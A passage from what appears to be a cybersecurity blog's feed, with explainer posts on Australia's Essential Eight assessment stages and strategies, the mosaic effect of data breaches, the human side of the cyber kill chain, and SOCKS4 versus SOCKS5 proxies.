type="text/html" title="Assessment planning and scoping"/><published>2023-11-24T11:00:00+00:00</published><updated>2023-11-24T11:00:00+00:00</updated><id>https://emdeh.github.io/blog/2023/assessment-planning-scoping</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/assessment-planning-scoping/"><![CDATA[<h2 id="introduction">Introduction</h2> <p>The planning and scoping stages of an assessment are essential for structuring the process and ensuring that the security insights gained accurately represent the environment being assessed. It’s vital to take into account the context in which an organisation operates, including the threat landscape during this stage. In this context, the threat landscape can mean the primary threat the organisation is facing. For example, insider threats or external threats - including the level of threat sophistication.</p> <p>Assessors should examine the organisation’s policies and procedures, conduct comprehensive tests of technical controls pertinent to each strategy, and assess their effectiveness. Determining the desired maturity level of the organization under assessment is key to guiding the assessment and establishing the appropriate scope and methods.</p> <p>The type and quality of evidence collected will play a role in the assessment outcomes, so it’s critical to ensure that the evidence gathered is of high quality and reliable as this will underpin the report’s conclusions and recommendations.</p> <p>When there are mandatory requirements for the implementation of the Essential Eight, there is a need for assessment to attest the level of maturity of the organisation’s cyber security controls. The assessment process, however, is intended to provide an organisation with actionable insights. For this reason, organisations who do not have a mandated requirement, will still find regular assessment helpful as a way to identify improvements.</p> <blockquote> <p><strong><em>Non-corporate entities within the Australian Government are typically required to obtain a Maturity Level Two within the broader context of the mandatory Protective Security Policy Framework (PSPF).</em></strong></p> </blockquote> <p>The following sections describe the four assessment stages.</p> <h2 id="stage-1---assessment-planning-and-preparation">Stage 1 - Assessment planning and preparation</h2> <p>During this stage pre-planning is undertaken to build a contextual overview of the organisation and the threat landscape it operates in. The assessor will aim to gain an understanding of the infrastructure, the teams the assessor will need to interact with, and the skills required to complete the assessment.</p> <p>As part of planning, the assessor should discuss the following with the asset owner:</p> <ul> <li>Determine asset classification and assessment scope.</li> <li>Requirements around access to low and high-privileged user accounts, devices, documentation, personnel, and facilities.</li> <li>Any approvals required to run scripts and tools within the environment.</li> <li>Evidence collection and protection requirements, including following the conclusion of the assessment.</li> <li>Finalising approval to use tools and scripts on sample systems/servers/networks.</li> <li>Requirements for where the assessment report will be developed (e.g. on the organisation’s system or externally).</li> <li>How stakeholder engagement and consultation should be approached, including confirming key points of contact.</li> <li>Whether any managed service providers support or manage any aspects of the system(s) under assessment; including appropriate points of contact if so.</li> <li>Obtaining copies of any previously completed assessment reports for the system.</li> <li>Agreement on appropriate use, retention and marketing of the assessment report by both parties.</li> </ul> <p>At the end of this stage, the assessor should have developed the assessment test plan.</p> <h2 id="stage-2---assessment-scoping">Stage 2 - Assessment scoping</h2> <p>Different maturity levels will impact aspects or components of the assessment. During this stage the assessor should become familiar with the requirements for the target maturity level, so the assessment approach and test plan can be adjusted accordingly.</p> <blockquote> <p><strong><em>The Essential Eight should be implemented and assessed as a package. If a system has not previously been assessed and demonstrated to meet Maturity Level One, that system should not be assessed for Maturity Level Two. Likewise, a system should be assessed and demonstrated to meet Maturity Level Two before being assessed for Maturity Level Three.</em></strong></p> </blockquote> <p>As part of determining the appropriate assessment approach, the assessor should conduct the following activities:</p> <ul> <li>Make use of asset registers that describe the environment to determine the applicability of the Essential Eight.</li> <li>Conduct workshops with the system owners to identify and agree on the precise assessment scope, including out-of-scope items.</li> <li>Agree with system owners on the assessment duration and milestones.</li> <li>Obtain an approximate breakdown of the operating systems used within the environment.</li> <li>Determine the necessary sample size to accurately represent all in-scope assets and types of assets.</li> <li>Document any assessment limitations, including sample sizes and constraints in the assessment report.</li> </ul> <h3 id="evidence-quality">Evidence quality</h3> <p>Assessments should strive to gather and use the highest calibre of evidence to effectively support the conclusions on the effectiveness of controls. Evidence quality requirements should be considered and discussed at this stage.</p> <p>It’s important to use a mix of both qualitative and quantitively techniques, as these will often complement each other and allow for cross-referencing. Qualitative techniques may included reviewing documentation and interviewing system administrators. Quantitative techniques could include reviewing system configurations or utilising tools and scripts.</p> <p>When conducting assessments, the quality of evidence can typically be categorised as follows:</p> <table> <thead> <tr> <th>Quality</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td>Excellent evidence</td> <td>Testing a control with a simulated activity that is designed to validate it is implemented <em>and</em> effective (e.g. attempting to run an application to check application control rulesets).</td> </tr> <tr> <td>Good evidence</td> <td>Review configuration settings of a system <em>through the system’s interface</em> (not screenshots or as-built documentation) to determine whether it a control should theoretically be enforced.</td> </tr> <tr> <td>Fair evidence</td> <td>Review a copy of a system’s configuration (e.g. using reports or screenshots) to determine whether it should enforce an expected control.</td> </tr> <tr> <td>Poor evidence</td> <td>A policy or verbal statement of intent (e.g. sighting mention of controls within artefacts such as as-built documents).</td> </tr> </tbody> </table> <p><br/></p> <h2 id="stage-3---assessment-of-controls">Stage 3 - Assessment of controls</h2> <p>At this stage the effectiveness of the controls within the Essential Eight are tested against the target Maturity Level.</p> <p>ACSC ahs developed standardised assessment outcomes which must be used.</p> <p>Each control can be assessed as:</p> <ul> <li><strong>Effective</strong>: The organisation is effectively meeting the control’s objective.</li> <li><strong>Ineffective</strong>: The organisation is not adequately meeting the control’s objective.</li> <li><strong>Alternate control:</strong> The organisation is effectively meeting the control’s objective through an alternate control.</li> <li><strong>Not assessed:</strong> The control has not yet been assessed.</li> <li><strong>Not applicable:</strong> The control does not apply to the system or environment.</li> <li><strong>No visibility:</strong> The assessor was unable to obtain adequate visibility of a control’s implementation.</li> </ul> <p>Importantly, the Essential Eight Maturity Model does not allow for risk acceptance without compensating controls. If a system owner has accepted a risk with no compensating controls, the mitigation strategy must be considered not implemented.</p> <p>Moreover, when evaluating the efficacy of compensating controls, it’s important to verify that the level of protection the compensating control(s) offer is commensurate to that prescribed by the Essential Eight to protect against the level of adversarial tradecraft for the target Maturity Level.</p> <blockquote> <p><strong><em>There is no scope in the Essential Eight model that allows for risks to be accepted without commensurate compensating controls.</em></strong></p> </blockquote> <h2 id="stage-4---development-of-the-assessment-report">Stage 4 - Development of the assessment report</h2> <p>In the final stage, the assessor will develop the security assessment report.</p> <h3 id="understanding-maturity-levels">Understanding maturity levels.</h3> <p>The report will contextualise the assessment against the Maturity Model. The Maturity Model contains four levels that provide a way for an organisation to measure its progress in implementing the Essential Eight while also identifying areas for improvement.</p> <p>There are three target levels, based on increasingly sophisticated levels of adversarial tradecraft. Level 0 exists for designating instances where the requirements of the first maturity level are not met.</p> <p>At <strong>Maturity Level 0</strong> weaknesses exist in the overall cyber security posture. This is also the default starting position if no assessment has been done previously.</p> <p>At <strong>Maturity Level One</strong> the focus is on protection against malicious actors who are content to simply leverage widely available tradecraft. This level maturity does not offer protection against APT tradecraft or other persistent threats, including insider threats.</p> <p>At <strong>Maturity Level Two</strong> a level of protection is reached that is sufficient to mitigate threats from malicious actors who are willing to invest more time in a target and in the effectiveness of their tools.</p> <p>At <strong>Maturity Level Three</strong> the focus is on threats who are more adaptive and much less reliant on public tools and techniques, such as state-sponsored actors, military operations, other APTs.</p> <h3 id="report-validity">Report validity</h3> <p>There’s no expiry date on the assessment report. Theoretically an assessment could be indefinite but assessors should be cautious of relying on previous report that are aged, and should consider doing a gap analysis to determine any deviations from succeeding changes to the Essential Eight, as well as changes within the environment itself.</p> <h3 id="treatment-and-exceptions">Treatment and exceptions</h3> <p>The use of exceptions for a system need to be documented and approved by an appropriate authority through a formal process. For government entities, the appropriate authority may be defined in the broader PSPF.</p> <p>Documentation for exceptions should include the scope and justification for the exception, as well as the following detail of the compensating controls:</p> <ul> <li>Reason, scope, and justification for compensating controls.</li> <li>Anticipated implementation lifetime of the compensating control(s).</li> <li>The review schedule of the compensating control.</li> <li>The system risk rating before and after the compensating control was implemented.</li> <li>Any caveats around the use of the system because of the exception.</li> <li>The formal acceptance from the appropriate authority of any residual risk for the system.</li> <li>When the need for the exception will next be considered by the appropriate authority, noting exceptions should not be approved beyond one year.</li> </ul> <h2 id="useful-resources">Useful resources</h2> <ul> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-assessment-process-guide">Essential Eight Assessment Process Guide | Cyber.gov.au</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-maturity-model">Essential Eight Maturity Model | Cyber.gov.au</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-maturity-model-faq">Essential Eight Maturity Model FAQ | Cyber.gov.au</a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><summary type="html"><![CDATA[The four stages of assessment]]></summary></entry><entry><title type="html">Overview of Essential Eight</title><link href="https://emdeh.github.io/blog/2023/overview-of-essential-eight/" rel="alternate" type="text/html" title="Overview of Essential Eight"/><published>2023-11-20T23:50:00+00:00</published><updated>2023-11-20T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2023/overview-of-essential-eight</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/overview-of-essential-eight/"><![CDATA[<h2 id="introduction">Introduction</h2> <p>Sometimes it’s helpful to contextualise what something <em>isn’t.</em> That is certainly the case with the Australian Signals Directorate’s <strong>Essential Eight</strong> <em>Strategies to Mitigate Cyber Security Incidents</em>.</p> <p>Often the Essential Eight and its Maturity Model are conflated with the Australian Government’s broader <em>Protective Security Policy Framework (PSPF),</em> which has its own Maturity Model.</p> <p>So, to begin lets set the scene.</p> <h3 id="where-did-the-essential-eight-come-from">Where did the Essential Eight come from?</h3> <p>In February 2010, the <em>Strategies to Mitigate Cyber Security Incidents</em> was published as an attempt to summaries the <em>Information Security Manual.</em> Seven years later a revision added a degree of relative security effectiveness to these 37 strategies. Eight of these were marked <em>Essential</em>, thus giving rise to the Essential Eight.</p> <p>Notably, the Essential Eight are not the <em>Easy Eight</em>. Nor is it the minimum needed for an effective cyber security posture. Instead, see it as a prioritisation. If you’re not sure where to start on a cyber security program of work, start with the Essential Eight.</p> <p>Indeed, the PSPF is quite explicit abbot this. <em>Policy 10: Safeguarding data from cyber threats</em> states that entities must mitigate common cyber threats by implementing the Essential Eight and considering what remaining 29 strategies need to be implemented to achieve an acceptable level of residual risk.</p> <blockquote> <p><strong><em>The Essential Eight is not all that you need to do. Policy 10 creates a requirement for entities to consider what remaining mitigation strategies they need to achieve an acceptable level of residual risk.</em></strong></p> </blockquote> <h3 id="whos-it-for">Who’s it for?</h3> <p>The Essential Eight is not designed for all environments. It focuses on Microsoft Windows environments and may not be as relevant for other settings, such as IoT or Operational Technology.</p> <p>Increasingly, government directives and legislative instruments are mandating the application of the Essential Eight as a risk management program.</p> <ul> <li>The PSPF mandates it for most government entities at the Federal level</li> <li>Some state governments have mandated it including, Victoria, Queensland, and New South Wales.</li> <li>Entities designated as Critical Infrastructure (Security of Critical Infrastructure Act 2018)</li> </ul> <h2 id="categorising-the-37-strategies">Categorising the 37 strategies</h2> <p>The strategies are categorised into five types:</p> <ol> <li>Preventing Malware delivery and execution.</li> <li>Limiting the extent of Cyber Security Incidents.</li> <li>Detecting Cyber Security Incidents and responding.</li> <li>Recovering data and system availability after a Cyber Security incident.</li> <li>Preventing malicious insiders.</li> </ol> <div class="row"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/20231120-strategiestomitigatecybersecurityincidents-480.webp"/> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/20231120-strategiestomitigatecybersecurityincidents-800.webp"/> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/20231120-strategiestomitigatecybersecurityincidents-1400.webp"/> <img src="/assets/img/20231120-strategiestomitigatecybersecurityincidents.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="Strategies to Mitigate Cyber Secyurity Incidents" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Source: <a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/strategies-mitigate-cyber-security-incidents"> cyber.gov.au </a> </div> <p>The strategies are also tagged against three further dimensions:</p> <ol> <li>Potential User Resistance</li> <li>Upfront cost</li> <li>Ongoing maintenance cost</li> </ol> <p>How these dimensions were baselined isn’t clear; presumably it’s relative.</p> <p>For the Essential Eight there are:</p> <ul> <li>Four <em>preventing</em> strategies.</li> <li>Three <em>limiting</em> strategies.</li> <li>One <em>recovering</em> strategy.</li> </ul> <h2 id="where-to-start">Where to start?</h2> <p>Logically, the advice is to follow a risk-based approach and start with strategies that mitigate the threats of most concern. This will look different for different organisations. The <em>Strategies to Mitigate Cyber Security Incidents</em> decompose this into the four following categories.</p> <h3 id="targeted-cyber-intrusions-and-other-external-malicious-actors-who-steal-data">Targeted cyber intrusions and other external malicious actors who steal data.</h3> <h4 id="step-1">Step 1</h4> <p>In this category, the first step is to implement the essential mitigation strategies that: a. prevent malware payload delivery and execution, b. limit the extent of cyber security incidents, and c. recover data and system availability.</p> <p><strong>Step 1 implementation order:</strong></p> <ol> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> <li>Regular backups</li> </ol> <h4 id="step-2">Step 2</h4> <p>Next, repeat the first step for the strategies with an effectiveness rating of ‘excellent’ in the detect, preventative, and limiting categories.</p> <p><strong>Step 2 implementation order:</strong></p> <ol> <li>Continuous incident detection and response</li> <li>Automated dynamic analysis of email and web content run in a sandbox.</li> <li>Email content filtering</li> <li>Web content filtering</li> <li>Deny corporate computers direct internet connectivity</li> <li>Operating system generic exploit mitigation</li> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> </ol> <h4 id="step-3">Step 3</h4> <p>Lastly, consider what remaining strategies are requires to achieve an acceptable level of residual risk.</p> <h3 id="ransomware-and-external-malicious-actors-who-destroy-data">Ransomware and external malicious actors who destroy data</h3> <h4 id="step-1-1">Step 1</h4> <p>For this category, the first step is to implement the Essential Eight that: a. recover data and system availability, b. prevent malware payload delivery and execution, and b. limit the extent of cyber security incidents.</p> <p><strong>Step 1 implementation order:</strong></p> <ol> <li>Regular backups</li> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> </ol> <h4 id="step-2-1">Step 2</h4> <p>Next, repeat the first step for the strategies with an effectiveness rating of ‘excellent’ in the detecting, preventative, and limiting categories.</p> <p><strong>Step 2 implementation order:</strong></p> <ol> <li>Continuous incident detection and response</li> <li>Automated dynamic analysis of email and web content run in a sandbox.</li> <li>Email content filtering</li> <li>Web content filtering</li> <li>Deny corporate computers direct internet connectivity</li> <li>Operating system generic exploit mitigation</li> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> </ol> <h4 id="step-3-1">Step 3</h4> <p>Lastly, consider what remaining strategies are requires to achieve an acceptable level of residual risk.</p> <h3 id="malicious-insiders-who-steal-data">Malicious insiders who steal data.</h3> <h4 id="step-1-and-2">Step 1 and 2</h4> <p>For this category, the first step is to implement data exfiltration by implementing the strategy <em>‘Control removable storage media and connected devices’</em>. Second is to implement the limiting strategy: <em>Outbound web and email data loss prevention’.</em></p> <p><strong>Step 1 and 2 implementation order:</strong></p> <ol> <li>Control removable storage media and connected devices.</li> <li>Outbound web and email data loss prevention.</li> </ol> <h4 id="step-3-2">Step 3</h4> <p>Next is to implement the Essential Eight <em>limiting</em> strategies, as well as those that allow <em>detection and response</em>.</p> <p><strong>Step 3 implementation order:</strong></p> <ol> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> <li>Continuous incident detection and response</li> </ol> <h4 id="step-4">Step 4</h4> <p>Then repeat the third step for strategies that have an effectiveness rating of excellent in the limiting category and also implement the preventative strategy of Personnel Management.</p> <p><strong>Step 4 implementation order:</strong></p> <ol> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> <li>Personnel management</li> </ol> <h4 id="step-5">Step 5</h4> <p>Lastly, if employees are likely to have the technical cyber security capabilities, implement the remaining Essential Eight strategies to prevent malware delivery, then repeat step 3 with less effective mitigation strategies to achieve an acceptable level of residual risk.</p> <p><strong>Step 5 implementation order:</strong></p> <ol> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> </ol> <h3 id="malicious-insiders-who-destroy-data-and-prevent-systems-functioning">Malicious insiders who destroy data and prevent systems functioning.</h3> <h4 id="step-1-2">Step 1</h4> <p>For this category, the first step is to implement the Essential Eight that: a. recover data and system availability, and b. limit the extent of cyber security incidents.</p> <p><strong>Step 1 implementation order:</strong></p> <ol> <li>Regular backups</li> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> </ol> <h4 id="step-2-2">Step 2</h4> <p>Next, repeat the first step for the strategies with an effectiveness rating of ‘excellent’ in the detecting and limiting categories.</p> <p><strong>Step 2 implementation order:</strong></p> <ol> <li>Continuous incident detection and response</li> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> </ol> <h4 id="step-3-3">Step 3</h4> <p>Next, implement the preventative strategy of Personnel Management and, again, if employees are likely to have the technical cyber security capabilities, implement the remaining Essential Eight strategies to prevent malware delivery, then repeat step 3 with less effective mitigation strategies to achieve an acceptable level of residual risk.</p> <p><strong>Step 3 implementation order:</strong></p> <ol> <li>Personnel Management</li> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> </ol> <h2 id="where-to-start-1">Where to start</h2> <p>When implementing a strategy, first implement for high risk users and computers such as those who access to important data and/or are exposed to untrustworthy internet content. Then implement it for all other users and computers.</p> <h2 id="useful-resources">Useful resources</h2> <ul> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight"> Essential Eight | Cyber.gov.au</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/strategies-mitigate-cyber-security-incidents"> Strategies to Mitigate Cyber Security Incidents | Cyber.gov.au </a></li> <li><a href="https://www.protectivesecurity.gov.au/policies"> Policies | Protective Security Policy Framework </a></li> <li><a href="https://www.protectivesecurity.gov.au/publications-library/policy-10-safeguarding-data-cyber-threats"> Policy 10: Safeguarding data from cyber threats | Protective Security Policy Framework </a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><summary type="html"><![CDATA[Where did the Essential Eight come from, and who's it for?]]></summary></entry><entry><title type="html">The Mosaic Effect</title><link href="https://emdeh.github.io/blog/2023/mosaic-effects/" rel="alternate" type="text/html" title="The Mosaic Effect"/><published>2023-11-08T23:50:00+00:00</published><updated>2023-11-08T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2023/mosaic-effects</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/mosaic-effects/"><![CDATA[<p>An older post resurrected from another platform, because it will always be relevant.</p> <p>Despite the more high-profile breaches of late, the impact of the mosaic effect remains understated. This <h ref="https://www.abc.net.au/news/2023-05-18/data-breaches-your-identity-interactive/102175688">interactive article&lt;/a&gt; from the ABC and the creator of <h ref="https://haveibeenpwned.com/">';--have i been pwned?&lt;/a&gt; visually (and scarily) gets the point across with - well, mosaics! A timely reminder to minimise the PII we give out and not to re-use passwords.</h></h></p> <h1 id="what-is-the-mosaic-effect">What is the Mosaic Effect?</h1> <p>The mosaic effect demonstrates how seemingly innocuous pieces of information, when combined, can create a detailed and revealing picture of an individual’s identity, much like tiles forming a complete mosaic. Each data breach, no matter how insignificant it may seem, can contribute another tile to this unintended portrait. This piecemeal approach to data collection and the subsequent risk of re-identification in data sets that were thought to be anonymous or de-identified is an increasingly prominent concern in the digital age.</p> <p>The risk also extends beyond the individual and into organizations. Inadvertent disclosure of sensitive information through various seemingly harmless data releases can lead to security vulnerabilities, making companies an unwitting participant in this digital patchwork of information.</p> <h1 id="what-can-you-do">What can you do?</h1> <p>Aside from minimising the PII and not re-using passwords, the more cautious among us may want to consider using masked emails and pseudo-anonymising your PII for online services.</p> <p>Masked emails are aliases that forward to your real email, helping keep your actual email address out of the public domain. This can be a valuable tool in combating phishing attempts. Pseudo-anonymising data, or replacing private identifiers with fake identifiers or pseudonyms, can reduce the risk of identity theft or data misuse.</p> <p>Password managers are more than just convenience tools; they’re a crucial component in the fight against the mosaic effect. They encourage strong, unique passwords for every account and service, making it difficult for attackers to piece together your digital identity even if they gain access to one set of credentials.</p> <p>The mosaic effect underscores the need for a proactive approach to data privacy. By being vigilant about the data we share and how we protect it, we can thwart the efforts of those who seek to piece together our digital lives. Protecting our real identities only takes a little effort but can have a profound impact on our digital security and privacy.</p>]]></content><author><name></name></author><category term="Explainers"/><category term="security-awareness"/><category term="awareness"/><category term="education"/><category term="mosaic-effect"/><category term="PII"/><category term="passwords"/><summary type="html"><![CDATA[See your identity pieced together from stolen data.]]></summary></entry><entry><title type="html">Human Disruption - Breaking the Cyber Kill Chain</title><link href="https://emdeh.github.io/blog/2023/cyber-kill-chain/" rel="alternate" type="text/html" title="Human Disruption - Breaking the Cyber Kill Chain"/><published>2023-11-05T15:14:00+00:00</published><updated>2023-11-05T15:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/cyber-kill-chain</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/cyber-kill-chain/"><![CDATA[<h1 id="what-is-the-cyber-kill-chain-model">What is the Cyber Kill Chain Model?</h1> <p>The ‘kill chain’ concept is a borrowed military term that outlines the stages of an adversary’s attack methodology. Intercepting attackers at multiple points increases the likelihood of disrupting the threat or forcing the adversary to take more detectable actions.</p> <p>The prevailing application of kill chain models focuses on technology and overlooks the human element. Incorporating human aspects, like security awareness and end-user education, isn’t just another security control; it’s a unique approach to managing the fallibility humans introduce into any system or process.</p> <h1 id="applying-the-human-element-to-cyber-kill-chains">Applying the human element to Cyber Kill Chains</h1> <p>Distilling a kill chain into its constituent steps is often highly context-dependent. In general, however, it can be conceptualised into the following categories:</p> <ol> <li>Reconnaissance</li> <li>Weaponisation</li> <li>Delivery</li> <li>Exploitation</li> <li>Persistence</li> <li>Command &amp; Control</li> <li>Actions on Objectives</li> </ol> <p>The following will briefly consider the human element at each step and how it can disrupt or detect an attack.</p> <h2 id="reconnaissance">Reconnaissance</h2> <p><em>Threat actors conduct preliminary information gathering.</em></p> <p>An informed workforce or user-base, understanding their role as potential targets, can significantly reduce information leakage by exercising caution on social media, verifying identities over the phone, and securely disposing of sensitive documents. While not a strategy that can mitigate the risk completely, these practices can impede an attacker’s reconnaissance efforts.</p> <h2 id="weaponisation">Weaponisation</h2> <p><em>Threat actors prepare appropriate tactics, techniques, and tools without direct contact with the target.</em></p> <p>Limited security measures can disrupt this phase, except where a threat actor conducts preliminary testing on the target, in which case, an informed user-base can act as additional “sensors” of IoCs.</p> <h2 id="delivery">Delivery</h2> <p><em>The threat actor launches the attack against the target.</em></p> <p>While technical solutions strive to block this phase, human intuition and adaptability can also play a crucial role. People are often the first line of defence in recognising and countering attacks, especially those involving social engineering.</p> <h2 id="exploitation">Exploitation</h2> <p><em>The threat actor executes the attack by, for example, exploiting vulnerabilities.</em></p> <p>Educated users are more likely to maintain updated systems and use security software, reducing the chances of successful exploitation.</p> <h2 id="persistence">Persistence</h2> <p><em>Threat actors, particularly APTs, will attempt to establish persistence to a compromised target</em></p> <p>If an attack has reached this stage, technical solutions are arguably the best line of defence, but humans can, again, play a crucial role. With their daily interaction with systems, users are ideally positioned to notice anomalies in performance or behaviour that could be symptomatic of an attack.</p> <h2 id="command--control">Command &amp; Control</h2> <p><em>Compromised systems contact external servers for further instructions.</em></p> <p>Proactive threat hunting aims to identify such suspicious communications.</p> <h2 id="actions-on-objectives">Actions on Objectives</h2> <p><em>Threat Actors will pursue their ultimate goal within the compromised network.</em></p> <p>Again, security-conscious behaviours by users - such as using strong passwords and scrutinising login activities - can complicate attackers’ efforts, enhancing the organisation’s detection capabilities and delaying lateral movement, data exfiltration, or privilege escalation.</p>]]></content><author><name></name></author><category term="Explainers"/><category term="security-awareness"/><category term="awareness"/><category term="cyber-kill-chain"/><category term="kill-chain"/><category term="education"/><summary type="html"><![CDATA[A brief overview of the importance of the human element in disrupting cyber kill chains.]]></summary></entry><entry><title type="html">SOCKS4 vs SOCKS5</title><link href="https://emdeh.github.io/blog/2023/socks/" rel="alternate" type="text/html" title="SOCKS4 vs SOCKS5"/><published>2023-10-31T14:14:00+00:00</published><updated>2023-10-31T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/socks</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/socks/"><![CDATA[<h2 id="what-is-socks">What is SOCKS</h2> <p>SOCKS stands for “SOCKet Secure” and is a protocol used for proxy servers. The protocol establishes a TCP connection to another server behind a firewall. The term “socket” refers to the combination of an IP address and port number.</p> <p>Here are the primary differences between SOCKS4 and SOCKS5:</p> <h2 id="socks4">SOCKS4</h2> <ul> <li><strong>Protocol Support</strong>: Supports TCP only.</li> <li><strong>Authentication</strong>: Doesn’t support authentication natively. Anyone with the proxy address and port can use it.</li> <li><strong>Hostname Resolution</strong>: Cannot resolve hostnames; requires the client to resolve the hostname to an IP address.</li> </ul> <h2 id="socks5">SOCKS5</h2> <ul> <li><strong>Protocol Support</strong>: Supports TCP and UDP.</li> <li><strong>Authentication</strong>: Provides a range of authentication mechanisms, including no authentication, username/password, and GSS-API.</li> <li><strong>Hostname Resolution</strong>: Can resolve hostnames, which means you can pass a domain name that SOCKS5 will resolve for you.</li> </ul> <p>Here’s a simple comparison in terms of features:</p> <table> <thead> <tr> <th>Feature</th> <th>SOCKS4</th> <th>SOCKS5</th> </tr> </thead> <tbody> <tr> <td>TCP Support</td> <td>✅</td> <td>✅</td> </tr> <tr> <td>UDP Support</td> <td>❌</td> <td>✅</td> </tr> <tr> <td>Authentication</td> <td>❌</td> <td>✅</td> </tr> <tr> <td>Hostname Resolution</td> <td>❌</td> <td>✅</td> </tr> </tbody> </table> <p>SOCKS5 is generally considered more secure and versatile due to its advanced features like authentication and support for both TCP and UDP protocols.</p>]]></content><author><name></name></author><category term="Explainers"/><category term="SOCKS"/><category term="socket"/><category term="TCP"/><summary type="html"><![CDATA[Differences between SOCKS 4 and 5.]]></summary></entry><entry><title type="html">Essential Eight Explainers</title><link href="https://emdeh.github.io/blog/2023/Essential-Eight/" rel="alternate" type="text/html" title="Essential Eight Explainers"/><published>2023-10-30T14:14:00+00:00</published><updated>2023-10-30T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/Essential-Eight</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/Essential-Eight/"><![CDATA[<h2 id="what-are-the-essential-eight">What are the Essential Eight</h2> <p>The Australian Signals Directorate’s <a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-explained"> Essential Eight Strategies to Mitigate Cyber Security Incidents</a> was developed as a prioritised baseline to assist organisations in protecting their systems against a range of cyber threats.</p> <p>Notably, the Essential Eight is just a starting point and is not exhaustive. Organisations should conduct regular risk assessments and adopt additional strategies based on their specific threat environment.</p> <p>For government entities covered by the Protective Security Policy Framework (PSPF), <a href="https://www.protectivesecurity.gov.au/publications-library/policy-10-safeguarding-data-cyber-threats">Policy 10: Safeguarding data from cyber threats</a> specifies that in addition to implementing the Essential Eight, entities should:</p> <blockquote> <p><em>“[consider] which of the remaining mitigation strategies from the <a href="https://www.cyber.gov.au/acsc/view-all-content/strategies-to-mitigate-cyber-security-incidents">Strategies to Mitigate Cyber Security Incidents</a> need to be implemented to achieve an acceptable level of residual risk for their entity.”</em></p> </blockquote> <p>Over the coming months, I’ll endeavour to produce PoCs and more detailed explainers that demonstrate why each of the Essential Eight is important and add to the <a href="https://emdeh.com/essential-eight-explainers/">Essential Eight Collection</a>, currently available in the navbar.</p> <p>The table below lists the Essential Eight, the typical exploits each strategy helps protect against and a brief example.</p> <h2 id="essential-eight-strategies">Essential Eight Strategies</h2> <p>1 - Application Control 2 - Patch Applications 3 - Configure Microsoft Office macro settings 4 - User Application Hardening 5 - Restrict Administrative Privileges 6 - Patch Operating Systems 7 - Multi-Factor Authentication 8 - Daily Backups</p> <table> <thead> <tr> <th>Strategy</th> <th>Typical Exploits Protected Against</th> <th>Example Exploit</th> </tr> </thead> <tbody> <tr> <td>Application Control</td> <td>Unauthorised/malicious software execution.</td> <td>A user unknowingly downloads and runs ransomware.</td> </tr> <tr> <td>Patch Applications</td> <td>Exploitation of known software vulnerabilities.</td> <td>Attacker exploits a known vulnerability in a PDF reader to run malicious code.</td> </tr> <tr> <td>Configure Microsoft Office macro settings</td> <td>Macro-based malware.</td> <td>A user opens an Office document from a phishing email which runs a malicious macro.</td> </tr> <tr> <td>User Application Hardening</td> <td>Drive-by downloads and web-based malicious content.</td> <td>A user visits a compromised website which then attempts to run Flash-based malware.</td> </tr> <tr> <td>Restrict Administrative Privileges</td> <td>Attacks that require admin rights to execute.</td> <td>An attacker gains user credentials that have unnecessary privileges and install keyloggers.</td> </tr> <tr> <td>Patch Operating Systems</td> <td>Exploitation of known OS vulnerabilities.</td> <td>Attacker exploits a known Windows vulnerability to gain remote code execution.</td> </tr> <tr> <td>Multi-Factor Authentication</td> <td>Credential theft or brute-force attacks.</td> <td>An attacker has a user’s password and can access their account remotely without the need for additonal authentication factors.</td> </tr> <tr> <td>Daily Backups</td> <td>Data loss due to ransomware, hardware failures, or accidental deletions.</td> <td>Ransomware encrypts a user’s files, but they can’t be restored from a backup.</td> </tr> </tbody> </table>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category 